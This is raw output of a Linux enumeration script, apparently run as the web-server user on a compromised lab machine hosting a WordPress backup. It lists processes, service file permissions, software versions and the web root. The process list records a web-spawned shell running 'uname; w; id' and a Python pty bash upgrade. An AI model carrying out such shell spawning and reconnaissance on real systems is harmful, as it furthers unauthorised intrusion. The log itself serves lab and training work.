root      1057  0.0  0.0   4632   660 tty5     Ss+  13:48   0:00 /sbin/getty -8 38400 tty5
root      1069  0.0  0.0   4632   660 tty2     Ss+  13:48   0:00 /sbin/getty -8 38400 tty2
root      1070  0.0  0.0   4632   660 tty3     Ss+  13:48   0:00 /sbin/getty -8 38400 tty3
root      1073  0.0  0.0   4632   656 tty6     Ss+  13:48   0:00 /sbin/getty -8 38400 tty6
root      1092  0.0  0.0   2176   612 ?        Ss   13:48   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root      1095  0.0  0.0   2620   760 ?        Ss   13:48   0:00 cron
daemon    1096  0.0  0.0   2472   292 ?        Ss   13:48   0:00 atd
root      1098  0.0  0.0   4696   836 ?        Ss   13:48   0:00 /usr/sbin/vsftpd
whoopsie  1103  0.0  0.2  26356  2840 ?        Ssl  13:48   0:00 whoopsie
mysql     1157  0.2  3.8 332120 39852 ?        Ssl  13:48   0:06 /usr/sbin/mysqld
root      1191  0.0  0.5  21720  5788 ?        Ss   13:48   0:00 /usr/sbin/apache2 -k start
www-data  1222  1.9  3.1  46192 32636 ?        S    13:48   0:49 /usr/sbin/apache2 -k start
www-data  1223  1.9  2.0  36192 21220 ?        S    13:48   0:50 /usr/sbin/apache2 -k start
www-data  1224  2.0  1.8  34600 19372 ?        S    13:48   0:51 /usr/sbin/apache2 -k start
root      1384  0.0  0.0   4632   660 tty1     Ss+  13:48   0:00 /sbin/getty -8 38400 tty1
nobody    1394  0.0  0.0   6624   976 ?        S    13:48   0:00 /usr/sbin/dnsmasq --no-resolv --keep-in-foreground --no-hosts --bind-interfaces --pid-file=/var/run/sendsigs.omit.d/network-manager.dnsmasq.pid --listen-address=127.0.0.1 --conf-file=/var/run/nm-dns-dnsmasq.conf --cache-size=0 --proxy-dnssec --enable-dbus --conf-dir=/etc/NetworkManager/dnsmasq.d
root      1720  0.0  0.0      0     0 ?        S    13:56   0:00 [kworker/u2:0]
www-data  1735  2.6  2.3  39508 24460 ?        S    13:59   0:49 /usr/sbin/apache2 -k start
www-data  1774  3.4  2.7  43432 28376 ?        S    14:07   0:48 /usr/sbin/apache2 -k start
www-data  1778  3.5  2.3  39500 24396 ?        S    14:07   0:49 /usr/sbin/apache2 -k start
www-data  1781  3.4  2.7  43424 28356 ?        S    14:07   0:49 /usr/sbin/apache2 -k start
www-data  1788  3.4  2.9  44928 29904 ?        S    14:07   0:48 /usr/sbin/apache2 -k start
www-data  1794  1.8  2.8  44872 29680 ?        S    14:07   0:26 /usr/sbin/apache2 -k start
www-data  1815  3.3  3.1  46432 32644 ?        S    14:07   0:48 /usr/sbin/apache2 -k start
www-data  5172  3.6  2.3  39500 24476 ?        S    14:19   0:25 /usr/sbin/apache2 -k start
www-data  5355  0.0  0.0   2236   536 ?        S    14:19   0:00 sh -c uname -a; w; id; python -c 'import pty;pty.spawn("/bin/bash")'
www-data  5359  0.0  0.4   9112  4280 ?        S    14:19   0:00 python -c import pty;pty.spawn("/bin/bash")
www-data  5360  0.0  0.1   3452  1696 pts/0    Ss   14:19   0:00 /bin/bash
www-data  5524  0.0  0.4   9112  4272 pts/0    S+   14:20   0:00 python -c import pty; pty.spawn("/bin/bash")
www-data  5525  0.0  0.1   3452  1704 pts/1    Ss   14:20   0:00 /bin/bash
www-data  8985  0.2  0.1   3528  1584 pts/1    S+   14:30   0:00 bash
www-data  8986  0.2  0.2   4824  2232 pts/1    S+   14:30   0:00 bash
www-data  8987  0.0  0.0   2156   284 pts/1    S+   14:30   0:00 tee -a
www-data 10662  0.0  0.1   4824  1940 pts/1    S+   14:31   0:00 bash
www-data 10663  0.0  0.1   2864  1036 pts/1    R+   14:31   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root   920788 Mar 28  2013 /bin/bash
-rwxr-xr-x 1 root root   568104 Sep  4  2013 /sbin/dhclient
-rwxr-xr-x 1 root root    26696 Mar 29  2012 /sbin/getty
-rwxr-xr-x 1 root root   194528 Jan 18  2013 /sbin/init
-rwxr-xr-x 1 root root   177552 Jul 19  2013 /sbin/udevd
-rwxr-xr-x 1 root root     9868 Sep 11  2013 /usr/lib/policykit-1/polkitd
lrwxrwxrwx 1 root root       34 Jul 15  2016 /usr/sbin/apache2 -> ../lib/apache2/mpm-prefork/apache2
-rwxr-xr-x 1 root root   885760 Mar 21  2012 /usr/sbin/bluetoothd
-rwxr-xr-x 1 root root   462388 May 13  2013 /usr/sbin/cupsd
-rwxr-xr-x 1 root root   188896 Jan 25  2013 /usr/sbin/dnsmasq
-rwxr-xr-x 1 root root   405776 Mar 24  2012 /usr/sbin/modem-manager
-rwxr-xr-x 1 root root 10515360 Jan 18  2017 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   531776 Aug 11  2016 /usr/sbin/sshd
-rwxr-xr-x 1 root root   170448 Mar 29  2012 /usr/sbin/vsftpd


[-] /etc/init.d/ binary permissions:
total 188
drwxr-xr-x   2 root root  4096 Mar  4 16:13 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root     0 Feb  4  2014 .legacy-bootordering
-rw-r--r--   1 root root  2427 Jul 26  2012 README
-rwxr-xr-x   1 root root   652 Sep 13  2012 acpi-support
lrwxrwxrwx   1 root root    21 Mar  3 10:43 acpid -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 alsa-restore -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 alsa-store -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 anacron -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  7621 Feb  6  2012 apache2
-rwxr-xr-x   1 root root  4596 Sep 25  2012 apparmor
lrwxrwxrwx   1 root root    21 Mar  3 10:43 apport -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 atd -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 avahi-daemon -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 bluetooth -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2444 Apr 14  2012 bootlogd
-rwxr-xr-x   1 root root  2125 Mar  1  2011 brltty
lrwxrwxrwx   1 root root    21 Mar  3 10:43 console-setup -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 cron -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 cups -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 dbus -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 dmesg -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1242 Dec 13  2011 dns-clean
lrwxrwxrwx   1 root root    21 Mar  3 10:43 failsafe-x -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 friendly-recovery -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1105 Dec  6  2013 grub-common
-rwxr-xr-x   1 root root  1329 Apr 14  2012 halt
lrwxrwxrwx   1 root root    21 Mar  3 10:43 hostname -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 hwclock -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 hwclock-save -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 irqbalance -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1893 Apr 18  2012 kerneloops
-rwxr-xr-x   1 root root  1293 Apr 14  2012 killprocs
lrwxrwxrwx   1 root root    21 Mar  3 10:43 lightdm -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 modemmanager -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 module-init-tools -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Jan 18  2017 mysql -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 network-interface -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 network-interface-container -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 network-interface-security -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 network-manager -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2797 Feb 13  2012 networking
-rwxr-xr-x   1 root root   882 Apr 14  2012 ondemand
lrwxrwxrwx   1 root root    21 Mar  3 10:43 passwd -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 plymouth -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 plymouth-log -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 plymouth-ready -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 plymouth-splash -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 plymouth-stop -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 plymouth-upstart-bridge -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   561 Feb  4  2011 pppd-dns
lrwxrwxrwx   1 root root    21 Mar  3 10:43 procps -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2180 Sep 26  2013 pulseaudio
-rwxr-xr-x   1 root root  8635 Jul 26  2012 rc
-rwxr-xr-x   1 root root   801 Apr 14  2012 rc.local
-rwxr-xr-x   1 root root   117 Jul 26  2012 rcS
-rwxr-xr-x   1 root root   639 Apr 14  2012 reboot
lrwxrwxrwx   1 root root    21 Mar  3 10:43 resolvconf -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 rfkill-restore -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 rfkill-store -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  4395 Nov  8  2011 rsync
lrwxrwxrwx   1 root root    21 Mar  3 10:43 rsyslog -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2344 Dec  4  2011 saned
-rwxr-xr-x   1 root root  4321 Apr 14  2012 sendsigs
lrwxrwxrwx   1 root root    21 Mar  3 10:43 setvtrgb -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   590 Apr 14  2012 single
-rw-r--r--   1 root root  4304 Jul 26  2012 skeleton
-rwxr-xr-x   1 root root  2107 May 15  2011 speech-dispatcher
-rwxr-xr-x   1 root root  4371 Aug 11  2016 ssh
-rwxr-xr-x   1 root root   567 Apr 14  2012 stop-bootlogd
-rwxr-xr-x   1 root root  1143 Apr 14  2012 stop-bootlogd-single
-rwxr-xr-x   1 root root   700 Oct 26  2011 sudo
lrwxrwxrwx   1 root root    21 Mar  3 10:43 udev -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 udev-fallback-graphics -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 udev-finish -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 udevmonitor -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 udevtrigger -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 ufw -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2800 Apr 14  2012 umountfs
-rwxr-xr-x   1 root root  2211 Apr 14  2012 umountnfs.sh
-rwxr-xr-x   1 root root  2926 Apr 14  2012 umountroot
-rwxr-xr-x   1 root root  1039 Nov  9  2011 unattended-upgrades
-rwxr-xr-x   1 root root  1985 Apr 14  2012 urandom
lrwxrwxrwx   1 root root    21 Mar 29  2012 vsftpd -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Mar  3 10:43 whoopsie -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2666 Mar 22  2012 x11-common


[-] /etc/init/ config file permissions:
total 340
drwxr-xr-x   2 root root  4096 Mar  4 16:13 .
drwxr-xr-x 130 root root 12288 Jul  2 06:48 ..
-rw-r--r--   1 root root   320 Dec  8  2011 acpid.conf
-rw-r--r--   1 root root   268 Mar 11  2013 alsa-restore.conf
-rw-r--r--   1 root root   267 Mar 11  2013 alsa-store.conf
-rw-r--r--   1 root root   278 Jun 20  2010 anacron.conf
-rw-r--r--   1 root root  1386 Oct 24  2013 apport.conf
-rw-r--r--   1 root root   261 Oct 25  2011 atd.conf
-rw-r--r--   1 root root   541 Oct 17  2011 avahi-daemon.conf
-rw-r--r--   1 root root  1009 Mar  7  2012 bluetooth.conf
-rw-r--r--   1 root root   509 Dec 21  2010 console-setup.conf
-rw-r--r--   1 root root   266 Apr 16  2012 console.conf
-rw-r--r--   1 root root  1122 Apr 16  2012 container-detect.conf
-rw-r--r--   1 root root   356 Apr 16  2012 control-alt-delete.conf
-rw-r--r--   1 root root   297 Apr  2  2012 cron.conf
-rw-r--r--   1 root root  1814 May 13  2013 cups.conf
-rw-r--r--   1 root root   510 Jan 10  2012 dbus.conf
-rw-r--r--   1 root root   273 Mar 30  2012 dmesg.conf
-rw-r--r--   1 root root   380 Aug 30  2011 failsafe-x.conf
-rw-r--r--   1 root root  1377 Apr 16  2012 failsafe.conf
-rw-r--r--   1 root root   267 Apr 16  2012 flush-early-job-log.conf
-rw-r--r--   1 root root  1247 Mar 14  2012 friendly-recovery.conf
-rw-r--r--   1 root root   317 May 26  2011 hostname.conf
-rw-r--r--   1 root root   444 Mar 29  2012 hwclock-save.conf
-rw-r--r--   1 root root   557 Mar 29  2012 hwclock.conf
-rw-r--r--   1 root root   131 Sep 28  2012 hybrid-gfx.conf
-rw-r--r--   1 root root   571 Feb  3  2012 irqbalance.conf
-rw-r--r--   1 root root  1324 Dec 18  2013 lightdm.conf
-rw-r--r--   1 root root   349 Mar 24  2012 modemmanager.conf
-rw-r--r--   1 root root   367 Mar 18  2011 module-init-tools.conf
-rw-r--r--   1 root root   349 Apr 12  2012 mountall-net.conf
-rw-r--r--   1 root root   261 Apr 12  2012 mountall-reboot.conf
-rw-r--r--   1 root root  1201 Apr 12  2012 mountall-shell.conf
-rw-r--r--   1 root root   943 Apr 12  2012 mountall.conf
-rw-r--r--   1 root root   405 Apr 12  2012 mounted-debugfs.conf
-rw-r--r--   1 root root   550 Apr 12  2012 mounted-dev.conf
-rw-r--r--   1 root root   480 Apr 12  2012 mounted-proc.conf
-rw-r--r--   1 root root   610 Apr 12  2012 mounted-run.conf
-rw-r--r--   1 root root  1890 Apr 12  2012 mounted-tmp.conf
-rw-r--r--   1 root root   903 Apr 12  2012 mounted-var.conf
-rw-r--r--   1 root root  1770 Jan 21  2014 mysql.conf
-rw-r--r--   1 root root   523 Apr  4  2012 network-interface-container.conf
-rw-r--r--   1 root root  1603 Apr  4  2012 network-interface-security.conf
-rw-r--r--   1 root root   803 Apr  4  2012 network-interface.conf
-rw-r--r--   1 root root   568 Jun 18  2013 network-manager.conf
-rw-r--r--   1 root root   388 Apr  4  2012 networking.conf
-rw-r--r--   1 root root   534 Sep 12  2012 passwd.conf
-rw-r--r--   1 root root   326 Mar 26  2010 plymouth-log.conf
-rw-r--r--   1 root root   647 May  3  2013 plymouth-ready.conf
-rw-r--r--   1 root root   899 Mar 18  2011 plymouth-splash.conf
-rw-r--r--   1 root root   800 Apr 13  2012 plymouth-stop.conf
-rw-r--r--   1 root root   367 Jan 25  2011 plymouth-upstart-bridge.conf
-rw-r--r--   1 root root   971 Nov  9  2011 plymouth.conf
-rw-r--r--   1 root root   363 Dec  5  2011 procps.conf
-rw-r--r--   1 root root  1543 Apr 16  2012 rc-sysinit.conf
-rw-r--r--   1 root root   454 Apr 16  2012 rc.conf
-rw-r--r--   1 root root   705 Apr 16  2012 rcS.conf
-rw-r--r--   1 root root   457 Mar 29  2012 resolvconf.conf
-rw-r--r--   1 root root   597 Mar 22  2012 rfkill-restore.conf
-rw-r--r--   1 root root   469 Mar 22  2012 rfkill-store.conf
-rw-r--r--   1 root root   426 Mar 30  2012 rsyslog.conf
-rw-r--r--   1 root root   230 Mar 18  2011 setvtrgb.conf
-rw-r--r--   1 root root   277 Apr 16  2012 shutdown.conf
-rw-r--r--   1 root root   667 Mar 26  2013 ssh.conf
-rw-r--r--   1 root root   348 Apr 16  2012 tty1.conf
-rw-r--r--   1 root root   333 Apr 16  2012 tty2.conf
-rw-r--r--   1 root root   333 Apr 16  2012 tty3.conf
-rw-r--r--   1 root root   333 Apr 16  2012 tty4.conf
-rw-r--r--   1 root root   232 Apr 16  2012 tty5.conf
-rw-r--r--   1 root root   232 Apr 16  2012 tty6.conf
-rw-r--r--   1 root root   637 Apr  4  2012 udev-fallback-graphics.conf
-rw-r--r--   1 root root   769 Aug 22  2011 udev-finish.conf
-rw-r--r--   1 root root   322 Dec 16  2011 udev.conf
-rw-r--r--   1 root root   356 Sep 29  2011 udevmonitor.conf
-rw-r--r--   1 root root   352 Apr  4  2012 udevtrigger.conf
-rw-r--r--   1 root root   473 Apr  5  2012 ufw.conf
-rw-r--r--   1 root root   329 Apr 16  2012 upstart-socket-bridge.conf
-rw-r--r--   1 root root   553 Apr 16  2012 upstart-udev-bridge.conf
-rw-r--r--   1 root root   683 Feb  3  2012 ureadahead-other.conf
-rw-r--r--   1 root root   889 Feb  3  2012 ureadahead.conf
-rw-r--r--   1 root root   737 Jan  2  2012 vsftpd.conf
-rw-r--r--   1 root root  1481 Apr 16  2012 wait-for-state.conf
-rw-r--r--   1 root root   362 Aug  1  2013 whoopsie.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 4.0K
drwxr-xr-x 9 root root 4.0K Feb  4  2014 system

/lib/systemd/system:
total 112K
drwxr-xr-x 2 root root 4.0K Feb  4  2014 basic.target.wants
drwxr-xr-x 2 root root 4.0K Feb  4  2014 halt.target.wants
drwxr-xr-x 2 root root 4.0K Feb  4  2014 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Feb  4  2014 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Feb  4  2014 dbus.target.wants
drwxr-xr-x 2 root root 4.0K Feb  4  2014 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Feb  4  2014 sockets.target.wants
-rw-r--r-- 1 root root 1.1K Dec 12  2013 avahi-daemon.service
-rw-r--r-- 1 root root  874 Dec 12  2013 avahi-daemon.socket
-rw-r--r-- 1 root root  231 Nov 26  2013 rsyslog.service
-rw-r--r-- 1 root root  433 Oct  8  2013 accounts-daemon.service
-rw-r--r-- 1 root root  953 Sep 13  2013 rtkit-daemon.service
-rw-r--r-- 1 root root  164 Jul 19  2013 udev-control.socket
-rw-r--r-- 1 root root  177 Jul 19  2013 udev-kernel.socket
-rw-r--r-- 1 root root  752 Jul 19  2013 udev-settle.service
-rw-r--r-- 1 root root  291 Jul 19  2013 udev-trigger.service
-rw-r--r-- 1 root root  341 Jul 19  2013 udev.service
-rw-r--r-- 1 root root  419 Jun 13  2013 dbus.service
-rw-r--r-- 1 root root  106 Jun 13  2013 dbus.socket
-rw-r--r-- 1 root root  432 Mar 19  2013 console-kit-daemon.service
-rw-r--r-- 1 root root  219 Mar 19  2013 console-kit-log-system-restart.service
-rw-r--r-- 1 root root  201 Mar 19  2013 console-kit-log-system-start.service
-rw-r--r-- 1 root root  218 Mar 19  2013 console-kit-log-system-stop.service
-rw-r--r-- 1 root root  469 Oct 23  2012 colord.service
-rw-r--r-- 1 root root  133 Apr 13  2012 upower.service
-rw-r--r-- 1 root root  137 Apr 12  2012 udisks.service
-rw-r--r-- 1 root root  189 Mar 21  2012 bluetooth.service
-rw-r--r-- 1 root root  188 Nov  8  2011 rsync.service

/lib/systemd/system/basic.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Mar  3 10:43 console-kit-log-system-start.service -> ../console-kit-log-system-start.service
lrwxrwxrwx 1 root root 23 Mar  3 10:43 udev-trigger.service -> ../udev-trigger.service
lrwxrwxrwx 1 root root 15 Mar  3 10:43 udev.service -> ../udev.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 38 Mar  3 10:43 console-kit-log-system-stop.service -> ../console-kit-log-system-stop.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 38 Mar  3 10:43 console-kit-log-system-stop.service -> ../console-kit-log-system-stop.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 41 Mar  3 10:43 console-kit-log-system-restart.service -> ../console-kit-log-system-restart.service

/lib/systemd/system/dbus.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Mar  3 10:43 dbus.socket -> ../dbus.socket

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Mar  3 10:43 dbus.service -> ../dbus.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Mar  3 10:43 dbus.socket -> ../dbus.socket
lrwxrwxrwx 1 root root 22 Mar  3 10:43 udev-control.socket -> ../udev-control.socket
lrwxrwxrwx 1 root root 21 Mar  3 10:43 udev-kernel.socket -> ../udev-kernel.socket


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.3p1


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.5.54, for debian-linux-gnu (i686) using readline 6.2


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] www home dir contents:
/var/www/:
total 8.1M
drwxr-xr-x  3 www-data www-data 4.0K Mar  7 11:55 .
drwxr-xr-x 15 root     root     4.0K Mar  7 12:17 ..
drwxr-xr-x  5 www-data www-data 4.0K Mar  7 12:05 backup_wordpress
-rw-r--r--  1 www-data www-data  177 Mar  3 11:17 index.html
-rw-r--r--  1 www-data www-data   43 Mar  3 12:32 robots.txt
-rw-------  1 abatchy  abatchy  8.1M Mar  7 11:54 wordpress-4.5.zip

/var/www/backup_wordpress:
total 196K
drwxr-xr-x  5 www-data www-data 4.0K Mar  7 12:05 .
drwxr-xr-x  3 www-data www-data 4.0K Mar  7 11:55 ..
-rw-r--r--  1 www-data www-data   35 Mar  7 12:05 .htaccess
-rw-r--r--  1 www-data www-data  418 Sep 24  2013 index.php
-rw-r--r--  1 www-data www-data  20K Mar  5  2016 license.txt
-rw-r--r--  1 www-data www-data 7.2K Dec  6  2015 readme.html
-rw-r--r--  1 www-data www-data 5.0K Jan 27  2016 wp-activate.php
drwxr-xr-x  9 www-data www-data 4.0K Apr 12  2016 wp-admin
-rw-r--r--  1 www-data www-data  364 Dec 19  2015 wp-blog-header.php
-rw-r--r--  1 www-data www-data 1.5K Jan 30  2016 wp-comments-post.php
-rw-r--r--  1 www-data www-data 2.8K Dec 16  2015 wp-config-sample.php
-rwxr-xr-x  1 www-data www-data 2.9K Mar  7 11:55 wp-config.php
drwxr-xr-x  6 www-data www-data 4.0K Jul  2 14:19 wp-content
-rw-r--r--  1 www-data www-data 3.3K May 24  2015 wp-cron.php
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 wp-includes
-rw-r--r--  1 www-data www-data 2.4K Oct 24  2013 wp-links-opml.php
-rw-r--r--  1 www-data www-data 3.3K Nov  5  2015 wp-load.php
-rw-r--r--  1 www-data www-data  34K Mar  5  2016 wp-login.php
-rw-r--r--  1 www-data www-data 7.8K Oct  6  2015 wp-mail.php
-rw-r--r--  1 www-data www-data  13K Feb 17  2016 wp-settings.php
-rw-r--r--  1 www-data www-data  28K Jan 27  2016 wp-signup.php
-rw-r--r--  1 www-data www-data 4.0K Nov 30  2014 wp-trackback.php
-rw-r--r--  1 www-data www-data 3.0K Oct  2  2015 xmlrpc.php

/var/www/backup_wordpress/wp-admin:
total 924K
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 5 www-data www-data 4.0K Mar  7 12:05 ..
-rw-r--r-- 1 www-data www-data  12K Apr 12  2016 about.php
-rw-r--r-- 1 www-data www-data 3.6K Feb 25  2016 admin-ajax.php
-rw-r--r-- 1 www-data www-data 2.4K May 28  2015 admin-footer.php
-rw-r--r-- 1 www-data www-data  403 Dec 24  2013 admin-functions.php
-rw-r--r-- 1 www-data www-data 6.9K Jun 23  2015 admin-header.php
-rw-r--r-- 1 www-data www-data 1.7K Feb 25  2016 admin-post.php
-rw-r--r-- 1 www-data www-data  11K Mar 27  2016 admin.php
-rw-r--r-- 1 www-data www-data 4.2K Sep 17  2015 async-upload.php
-rw-r--r-- 1 www-data www-data  11K Apr  5  2016 comment.php
-rw-r--r-- 1 www-data www-data 4.7K Apr  9  2016 credits.php
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 css
-rw-r--r-- 1 www-data www-data  17K Sep 25  2015 custom-background.php
-rw-r--r-- 1 www-data www-data  44K Feb 23  2016 custom-header.php
-rw-r--r-- 1 www-data www-data 6.1K Feb 20  2016 customize.php
-rw-r--r-- 1 www-data www-data  13K Jan 14  2016 edit-comments.php
-rw-r--r-- 1 www-data www-data  32K Apr  5  2016 edit-form-advanced.php
-rw-r--r-- 1 www-data www-data 7.2K Mar 10  2016 edit-form-comment.php
-rw-r--r-- 1 www-data www-data 5.9K Oct 14  2015 edit-link-form.php
-rw-r--r-- 1 www-data www-data 8.6K Mar 11  2016 edit-tag-form.php
-rw-r--r-- 1 www-data www-data  21K Jan 15  2016 edit-tags.php
-rw-r--r-- 1 www-data www-data  16K Jan 14  2016 edit.php
-rw-r--r-- 1 www-data www-data  11K Dec 31  2015 export.php
-rw-r--r-- 1 www-data www-data 3.4K Apr  9  2016 freedoms.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 images
-rw-r--r-- 1 www-data www-data 5.2K Mar 10  2016 import.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 includes
-rw-r--r-- 1 www-data www-data 6.0K Jan  5  2016 index.php
-rw-r--r-- 1 www-data www-data 5.7K Oct 14  2015 install-helper.php
-rw-r--r-- 1 www-data www-data  16K Feb 23  2016 install.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 js
-rw-r--r-- 1 www-data www-data  712 Sep 24  2013 link-add.php
-rw-r--r-- 1 www-data www-data 3.6K Jan 14  2016 link-manager.php
-rw-r--r-- 1 www-data www-data 2.1K May 28  2015 link-parse-opml.php
-rw-r--r-- 1 www-data www-data 2.6K Jul 17  2014 link.php
-rw-r--r-- 1 www-data www-data 2.2K Jan 15  2016 load-scripts.php
-rw-r--r-- 1 www-data www-data 2.8K Jan 18  2016 load-styles.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 maint
-rw-r--r-- 1 www-data www-data 3.1K Sep 10  2015 media-new.php
-rw-r--r-- 1 www-data www-data 3.3K Sep  2  2015 media-upload.php
-rw-r--r-- 1 www-data www-data 5.1K Mar  8  2016 media.php
-rw-r--r-- 1 www-data www-data 8.9K Mar 12  2016 menu-header.php
-rw-r--r-- 1 www-data www-data  13K Feb  3  2016 menu.php
-rw-r--r-- 1 www-data www-data  320 Sep 24  2013 moderation.php
-rw-r--r-- 1 www-data www-data  211 Sep 24  2013 ms-admin.php
-rw-r--r-- 1 www-data www-data 3.8K Jul  1  2015 ms-delete-site.php
-rw-r--r-- 1 www-data www-data  231 Sep 24  2013 ms-edit.php
-rw-r--r-- 1 www-data www-data  236 Sep 24  2013 ms-options.php
-rw-r--r-- 1 www-data www-data  228 Sep 24  2013 ms-sites.php
-rw-r--r-- 1 www-data www-data  230 Sep 24  2013 ms-themes.php
-rw-r--r-- 1 www-data www-data  232 Sep 24  2013 ms-upgrade-network.php
-rw-r--r-- 1 www-data www-data  228 Sep 24  2013 ms-users.php
-rw-r--r-- 1 www-data www-data 4.6K Feb 25  2016 my-sites.php
-rw-r--r-- 1 www-data www-data  41K Mar  4  2016 nav-menus.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 network
-rw-r--r-- 1 www-data www-data 5.3K Sep 18  2015 network.php
-rw-r--r-- 1 www-data www-data  14K Oct 21  2015 options-discussion.php
-rw-r--r-- 1 www-data www-data  15K Feb 23  2016 options-general.php
-rw-r--r-- 1 www-data www-data  492 Mar  1  2013 options-head.php
-rw-r--r-- 1 www-data www-data 5.8K Nov  5  2015 options-media.php
-rw-r--r-- 1 www-data www-data  15K Jan  1  2016 options-permalink.php
-rw-r--r-- 1 www-data www-data 8.3K Sep 10  2015 options-reading.php
-rw-r--r-- 1 www-data www-data 7.9K Jan  1  2016 options-writing.php
-rw-r--r-- 1 www-data www-data  12K Nov 18  2015 options.php
-rw-r--r-- 1 www-data www-data  12K Oct 12  2015 plugin-editor.php
-rw-r--r-- 1 www-data www-data 5.2K Oct  6  2015 plugin-install.php
-rw-r--r-- 1 www-data www-data  21K Feb 23  2016 plugins.php
-rw-r--r-- 1 www-data www-data 2.7K Sep  2  2015 post-new.php
-rw-r--r-- 1 www-data www-data 7.7K Oct 19  2015 post.php
-rw-r--r-- 1 www-data www-data  696 Sep  2  2015 press-this.php
-rw-r--r-- 1 www-data www-data  296 Sep 24  2013 profile.php
-rw-r--r-- 1 www-data www-data 4.9K Sep  8  2015 revision.php
-rw-r--r-- 1 www-data www-data  15K Mar  6  2016 setup-config.php
-rw-r--r-- 1 www-data www-data 2.0K Mar 11  2016 term.php
-rw-r--r-- 1 www-data www-data  12K Oct 14  2015 theme-editor.php
-rw-r--r-- 1 www-data www-data  13K Mar 30  2016 theme-install.php
-rw-r--r-- 1 www-data www-data  20K Feb 23  2016 themes.php
-rw-r--r-- 1 www-data www-data 5.5K Aug 30  2015 tools.php
-rw-r--r-- 1 www-data www-data  30K Apr  6  2016 update-core.php
-rw-r--r-- 1 www-data www-data  11K Sep 26  2015 update.php
-rw-r--r-- 1 www-data www-data  338 Dec 24  2013 upgrade-functions.php
